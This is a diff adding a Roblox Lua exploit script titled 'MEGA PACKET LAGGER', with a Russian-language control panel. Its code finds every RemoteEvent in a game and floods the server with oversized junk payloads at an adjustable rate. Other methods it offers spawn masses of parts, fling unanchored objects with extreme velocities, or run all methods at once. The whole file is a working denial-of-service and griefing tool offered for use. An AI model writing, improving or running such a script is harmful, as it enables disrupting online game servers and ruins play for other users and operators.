@@ -1,0 +1,472 @@
+-- МЕГА-ЛАГГЕР с диапазоном пакетов 100-2500
+local player = game.Players.LocalPlayer
+local laggerActive = false
+local packetSize = 1000 -- стандартный размер
+local minPackets = 100
+local maxPackets = 2500
+local packetRate = 0.01
+local totalPackets = 0
+local selectedMethod = 1
+
+-- Создание GUI
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local PacketRangeLabel = Instance.new("TextLabel")
+local PacketSlider = Instance.new("TextButton") -- Для простоты используем кнопки
+local PacketValue = Instance.new("TextLabel")
+local RateLabel = Instance.new("TextLabel")
+local RateSlider = Instance.new("TextButton")
+local RateValue = Instance.new("TextLabel")
+local MethodSelector = Instance.new("TextButton")
+local StartBtn = Instance.new("TextButton")
+local StopBtn = Instance.new("TextButton")
+local PacketCounter = Instance.new("TextLabel")
+local Status = Instance.new("TextLabel")
+local CloseBtn = Instance.new("TextButton")
+
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.new(0.1, 0.05, 0.2)
+MainFrame.Position = UDim2.new(0.25, 0, 0.2, 0)
+MainFrame.Size = UDim2.new(0.5, 0, 0.6, 0)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.BorderSizePixel = 3
+MainFrame.BorderColor3 = Color3.new(1, 0, 0)
+
+Title.Parent = MainFrame
+Title.BackgroundColor3 = Color3.new(0.6, 0, 0)
+Title.Size = UDim2.new(1, 0, 0.12, 0)
+Title.Text = "💣 MEGA PACKET LAGGER 100-2500 💣"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextScaled = true
+
+-- === РАЗМЕР ПАКЕТА (100-2500) ===
+local packetFrame = Instance.new("Frame")
+packetFrame.Parent = MainFrame
+packetFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+packetFrame.Position = UDim2.new(0.1, 0, 0.15, 0)
+packetFrame.Size = UDim2.new(0.8, 0, 0.12, 0)
+
+PacketRangeLabel.Parent = packetFrame
+PacketRangeLabel.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+PacketRangeLabel.Position = UDim2.new(0, 0, 0, 0)
+PacketRangeLabel.Size = UDim2.new(1, 0, 0.3, 0)
+PacketRangeLabel.Text = "📦 РАЗМЕР ПАКЕТА (100-2500)"
+PacketRangeLabel.TextColor3 = Color3.new(1, 1, 0)
+PacketRangeLabel.TextScaled = true
+
+local PacketMinus100 = Instance.new("TextButton")
+PacketMinus100.Parent = packetFrame
+PacketMinus100.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+PacketMinus100.Position = UDim2.new(0.02, 0, 0.4, 0)
+PacketMinus100.Size = UDim2.new(0.12, 0, 0.5, 0)
+PacketMinus100.Text = "-100"
+PacketMinus100.TextScaled = true
+
+local PacketMinus10 = Instance.new("TextButton")
+PacketMinus10.Parent = packetFrame
+PacketMinus10.BackgroundColor3 = Color3.new(0.8, 0.4, 0.4)
+PacketMinus10.Position = UDim2.new(0.15, 0, 0.4, 0)
+PacketMinus10.Size = UDim2.new(0.1, 0, 0.5, 0)
+PacketMinus10.Text = "-10"
+PacketMinus10.TextScaled = true
+
+PacketValue.Parent = packetFrame
+PacketValue.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
+PacketValue.Position = UDim2.new(0.26, 0, 0.4, 0)
+PacketValue.Size = UDim2.new(0.28, 0, 0.5, 0)
+PacketValue.Text = packetSize
+PacketValue.TextColor3 = Color3.new(0, 1, 0)
+PacketValue.TextScaled = true
+
+local PacketPlus10 = Instance.new("TextButton")
+PacketPlus10.Parent = packetFrame
+PacketPlus10.BackgroundColor3 = Color3.new(0.4, 0.8, 0.4)
+PacketPlus10.Position = UDim2.new(0.55, 0, 0.4, 0)
+PacketPlus10.Size = UDim2.new(0.1, 0, 0.5, 0)
+PacketPlus10.Text = "+10"
+PacketPlus10.TextScaled = true
+
+local PacketPlus100 = Instance.new("TextButton")
+PacketPlus100.Parent = packetFrame
+PacketPlus100.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
+PacketPlus100.Position = UDim2.new(0.66, 0, 0.4, 0)
+PacketPlus100.Size = UDim2.new(0.12, 0, 0.5, 0)
+PacketPlus100.Text = "+100"
+PacketPlus100.TextScaled = true
+
+local PacketMaxBtn = Instance.new("TextButton")
+PacketMaxBtn.Parent = packetFrame
+PacketMaxBtn.BackgroundColor3 = Color3.new(0.8, 0.8, 0)
+PacketMaxBtn.Position = UDim2.new(0.8, 0, 0.4, 0)
+PacketMaxBtn.Size = UDim2.new(0.18, 0, 0.5, 0)
+PacketMaxBtn.Text = "MAX"
+PacketMaxBtn.TextScaled = true
+
+-- === СКОРОСТЬ ПАКЕТОВ ===
+local rateFrame = Instance.new("Frame")
+rateFrame.Parent = MainFrame
+rateFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+rateFrame.Position = UDim2.new(0.1, 0, 0.3, 0)
+rateFrame.Size = UDim2.new(0.8, 0, 0.1, 0)
+
+RateLabel.Parent = rateFrame
+RateLabel.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+RateLabel.Position = UDim2.new(0, 0, 0, 0)
+RateLabel.Size = UDim2.new(1, 0, 0.4, 0)
+RateLabel.Text = "⚡ СКОРОСТЬ ОТПРАВКИ"
+RateLabel.TextColor3 = Color3.new(0, 1, 1)
+RateLabel.TextScaled = true
+
+local RateMinus = Instance.new("TextButton")
+RateMinus.Parent = rateFrame
+RateMinus.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+RateMinus.Position = UDim2.new(0.1, 0, 0.5, 0)
+RateMinus.Size = UDim2.new(0.15, 0, 0.4, 0)
+RateMinus.Text = "-0.01"
+RateMinus.TextScaled = true
+
+RateValue.Parent = rateFrame
+RateValue.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
+RateValue.Position = UDim2.new(0.3, 0, 0.5, 0)
+RateValue.Size = UDim2.new(0.4, 0, 0.4, 0)
+RateValue.Text = string.format("%.3f", packetRate) .. "c"
+RateValue.TextColor3 = Color3.new(1, 1, 0)
+RateValue.TextScaled = true
+
+local RatePlus = Instance.new("TextButton")
+RatePlus.Parent = rateFrame
+RatePlus.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
+RatePlus.Position = UDim2.new(0.75, 0, 0.5, 0)
+RatePlus.Size = UDim2.new(0.15, 0, 0.4, 0)
+RatePlus.Text = "+0.01"
+RatePlus.TextScaled = true
+
+-- === МЕТОДЫ ЛАГА ===
+local methods = {
+    "1️⃣ RemoteEvent MEGA СПАМ",
+    "2️⃣ BindableEvent ЦИКЛОН",
+    "3️⃣ Physics ХАОС",
+    "4️⃣ Instance КЛОНЕР",
+    "5️⃣ Data ПЕРЕГРУЗКА",
+    "6️⃣ ВСЕ МЕТОДЫ РАЗОМ"
+}
+
+MethodSelector.Parent = MainFrame
+MethodSelector.BackgroundColor3 = Color3.new(0.5, 0, 0.5)
+MethodSelector.Position = UDim2.new(0.1, 0, 0.43, 0)
+MethodSelector.Size = UDim2.new(0.8, 0, 0.1, 0)
+MethodSelector.Text = methods[1]
+MethodSelector.TextColor3 = Color3.new(1, 1, 1)
+MethodSelector.TextScaled = true
+
+-- === КНОПКИ УПРАВЛЕНИЯ ===
+StartBtn.Parent = MainFrame
+StartBtn.BackgroundColor3 = Color3.new(0, 0.7, 0)
+StartBtn.Position = UDim2.new(0.1, 0, 0.56, 0)
+StartBtn.Size = UDim2.new(0.35, 0, 0.08, 0)
+StartBtn.Text = "🚀 ЗАПУСТИТЬ"
+StartBtn.TextScaled = true
+
+StopBtn.Parent = MainFrame
+StopBtn.BackgroundColor3 = Color3.new(0.7, 0, 0)
+StopBtn.Position = UDim2.new(0.55, 0, 0.56, 0)
+StopBtn.Size = UDim2.new(0.35, 0, 0.08, 0)
+StopBtn.Text = "⏹ СТОП"
+StopBtn.TextScaled = true
+
+-- === СЧЕТЧИК ПАКЕТОВ ===
+PacketCounter.Parent = MainFrame
+PacketCounter.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+PacketCounter.Position = UDim2.new(0.1, 0, 0.67, 0)
+PacketCounter.Size = UDim2.new(0.8, 0, 0.08, 0)
+PacketCounter.Text = "📊 Отправлено пакетов: 0"
+PacketCounter.TextColor3 = Color3.new(1, 1, 0)
+PacketCounter.TextScaled = true
+
+-- === СТАТУС ===
+Status.Parent = MainFrame
+Status.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
+Status.Position = UDim2.new(0.1, 0, 0.78, 0)
+Status.Size = UDim2.new(0.8, 0, 0.12, 0)
+Status.Text = "💤 Ожидание... (100-2500 пакетов)"
+Status.TextColor3 = Color3.new(1, 1, 0)
+Status.TextScaled = true
+Status.TextWrapped = true
+
+-- === КНОПКА ЗАКРЫТИЯ ===
+CloseBtn.Parent = MainFrame
+CloseBtn.BackgroundColor3 = Color3.new(1, 0, 0)
+CloseBtn.Position = UDim2.new(0.94, 0, 0.02, 0)
+CloseBtn.Size = UDim2.new(0.05, 0, 0.06, 0)
+CloseBtn.Text = "X"
+CloseBtn.TextScaled = true
+
+-- === ПЕРЕМЕННЫЕ ===
+local remoteEvents = {}
+local bindableEvents = {}
+local laggerThreads = {}
+
+-- === ПОИСК ВСЕХ СОБЫТИЙ ===
+local function findAllEvents()
+    remoteEvents = {}
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") then
+            table.insert(remoteEvents, v)
+        end
+    end
+    
+    Status.Text = "🔍 Найдено RemoteEvent'ов: " .. #remoteEvents
+    wait(1)
+    Status.Text = "💤 Готов к работе (100-2500 пакетов)"
+end
+
+-- === ГЕНЕРАЦИЯ ПАКЕТОВ ===
+local function generatePackets(count)
+    local packets = {}
+    for i = 1, count do
+        table.insert(packets, {
+            id = totalPackets + i,
+            data = string.rep("LAG", math.random(50, 200)),
+            random = math.random(),
+            timestamp = tick(),
+            player = player.Name,
+            table_data = {
+                a = math.random(1, 10000),
+                b = math.random(1, 10000),
+                c = math.random(1, 10000),
+                d = math.random(1, 10000)
+            }
+        })
+    end
+    return packets
+end
+
+-- === МЕТОД 1: REMOTEEVENT МЕГА СПАМ ===
+local function method1_spam()
+    while laggerActive do
+        local packets = generatePackets(packetSize)
+        for _, remote in pairs(remoteEvents) do
+            if not laggerActive then break end
+            pcall(function()
+                remote:FireServer({
+                    method = "MEGA_PACKET",
+                    packets = packets,
+                    size = packetSize,
+                    timestamp = tick()
+                })
+                totalPackets = totalPackets + packetSize
+            end)
+        end
+        PacketCounter.Text = "📊 Отправлено пакетов: " .. totalPackets
+        wait(packetRate)
+    end
+end
+
+-- === МЕТОД 2: BINDABLEEVENT ЦИКЛОН ===
+local function method2_spam()
+    local bindable = Instance.new("BindableEvent")
+    while laggerActive do
+        for i = 1, packetSize do
+            if not laggerActive then break end
+            local packetData = {
+                type = "CYCLONE",
+                id = totalPackets + i,
+                data = string.rep("🌀", 500)
+            }
+            bindable:Fire(packetData)
+            totalPackets = totalPackets + 1
+        end
+        PacketCounter.Text = "📊 Отправлено пакетов: " .. totalPackets
+        wait(packetRate)
+    end
+    bindable:Destroy()
+end
+
+-- === МЕТОД 3: PHYSICS ХАОС ===
+local function method3_spam()
+    while laggerActive do
+        for i = 1, packetSize do
+            if not laggerActive then break end
+            for _, v in pairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") and v.Anchored == false then
+                    pcall(function()
+                        v.Velocity = Vector3.new(
+                            math.random(-5000, 5000),
+                            math.random(-5000, 5000),
+                            math.random(-5000, 5000)
+                        )
+                    end)
+                end
+            end
+            totalPackets = totalPackets + 1
+        end
+        PacketCounter.Text = "📊 Отправлено пакетов: " .. totalPackets
+        wait(packetRate)
+    end
+end
+
+-- === МЕТОД 4: INSTANCE КЛОНЕР ===
+local function method4_spam()
+    while laggerActive do
+        for i = 1, packetSize do
+            if not laggerActive then break end
+            local part = Instance.new("Part")
+            part.Parent = workspace
+            part.Size = Vector3.new(math.random(1, 10), math.random(1, 10), math.random(1, 10))
+            part.Position = Vector3.new(
+                math.random(-100, 100),
+                math.random(0, 50),
+                math.random(-100, 100)
+            )
+            part.Anchored = true
+            part.BrickColor = BrickColor.Random()
+            game:GetService("Debris"):AddItem(part, 0.5)
+            totalPackets = totalPackets + 1
+        end
+        PacketCounter.Text = "📊 Отправлено пакетов: " .. totalPackets
+        wait(packetRate)
+    end
+end
+
+-- === МЕТОД 5: DATA ПЕРЕГРУЗКА ===
+local function method5_spam()
+    while laggerActive do
+        local hugeData = {}
+        for i = 1, packetSize do
+            table.insert(hugeData, {
+                index = i,
+                value = math.random(),
+                text = string.rep("DATA", 100)
+            })
+        end
+        
+        for _, remote in pairs(remoteEvents) do
+            pcall(function()
+                remote:FireServer({
+                    type = "DATA_OVERLOAD",
+                    data = hugeData,
+                    size = packetSize
+                })
+            end)
+        end
+        totalPackets = totalPackets + packetSize
+        PacketCounter.Text = "📊 Отправлено пакетов: " .. totalPackets
+        wait(packetRate)
+    end
+end
+
+-- === МЕТОД 6: ВСЕ МЕТОДЫ РАЗОМ ===
+local function method6_spam()
+    spawn(method1_spam)
+    spawn(method2_spam)
+    spawn(method3_spam)
+    spawn(method4_spam)
+    spawn(method5_spam)
+end
+
+-- === УПРАВЛЕНИЕ РАЗМЕРОМ ПАКЕТА ===
+PacketMinus100.MouseButton1Click:Connect(function()
+    packetSize = math.max(minPackets, packetSize - 100)
+    PacketValue.Text = packetSize
+    Status.Text = "📦 Размер пакета: " .. packetSize
+end)
+
+PacketMinus10.MouseButton1Click:Connect(function()
+    packetSize = math.max(minPackets, packetSize - 10)
+    PacketValue.Text = packetSize
+    Status.Text = "📦 Размер пакета: " .. packetSize
+end)
+
+PacketPlus10.MouseButton1Click:Connect(function()
+    packetSize = math.min(maxPackets, packetSize + 10)
+    PacketValue.Text = packetSize
+    Status.Text = "📦 Размер пакета: " .. packetSize
+end)
+
+PacketPlus100.MouseButton1Click:Connect(function()
+    packetSize = math.min(maxPackets, packetSize + 100)
+    PacketValue.Text = packetSize
+    Status.Text = "📦 Размер пакета: " .. packetSize
+end)
+
+PacketMaxBtn.MouseButton1Click:Connect(function()
+    packetSize = maxPackets
+    PacketValue.Text = packetSize
+    Status.Text = "📦 Размер пакета: МАКСИМУМ 2500"
+end)
+
+-- === УПРАВЛЕНИЕ СКОРОСТЬЮ ===
+RateMinus.MouseButton1Click:Connect(function()
+    if packetRate > 0.001 then
+        packetRate = packetRate - 0.001
+        RateValue.Text = string.format("%.3f", packetRate) .. "c"
+    end
+end)
+
+RatePlus.MouseButton1Click:Connect(function()
+    if packetRate < 0.1 then
+        packetRate = packetRate + 0.001
+        RateValue.Text = string.format("%.3f", packetRate) .. "c"
+    end
+end)
+
+-- === ПЕРЕКЛЮЧЕНИЕ МЕТОДОВ ===
+MethodSelector.MouseButton1Click:Connect(function()
+    selectedMethod = selectedMethod + 1
+    if selectedMethod > #methods then selectedMethod = 1 end
+    MethodSelector.Text = methods[selectedMethod]
+end)
+
+-- === ЗАПУСК ЛАГГЕРА ===
+StartBtn.MouseButton1Click:Connect(function()
+    if laggerActive then return end
+    
+    if #remoteEvents == 0 then
+        findAllEvents()
+    end
+    
+    laggerActive = true
+    totalPackets = 0
+    StartBtn.BackgroundColor3 = Color3.new(0.5, 0.5, 0)
+    StopBtn.BackgroundColor3 = Color3.new(1, 0, 0)
+    Status.Text = "🔥 ОТПРАВКА ПАКЕТОВ... (" .. packetSize .. " пакетов)"
+    Status.TextColor3 = Color3.new(1, 0, 0)
+    
+    -- Запускаем выбранный метод
+    if selectedMethod == 1 then
+        spawn(method1_spam)
+    elseif selectedMethod == 2 then
+        spawn(method2_spam)
+    elseif selectedMethod == 3 then
+        spawn(method3_spam)
+    elseif selectedMethod == 4 then
+        spawn(method4_spam)
+    elseif selectedMethod == 5 then
+        spawn(method5_spam)
+    elseif selectedMethod == 6 then
+        spawn(method6_spam)
+    end
+end)
+
+-- === ОСТАНОВКА ===
+StopBtn.MouseButton1Click:Connect(function()
+    laggerActive = false
+    StartBtn.BackgroundColor3 = Color3.new(0, 0.7, 0)
+    StopBtn.BackgroundColor3 = Color3.new(0.7, 0, 0)
+    Status.Text = "⏹ Отправка остановлена. Отправлено: " .. totalPackets .. " пакетов"
+    Status.TextColor3 = Color3.new(1, 1, 0)
+end)
+
+-- === ЗАКРЫТИЕ ===
+CloseBtn.MouseButton1Click:Connect(function()
+    laggerActive = false
+    ScreenGui:Destroy()
+end)
+
+-- === ЗАПУСК ПОИСКА ===
+findAllEvents()
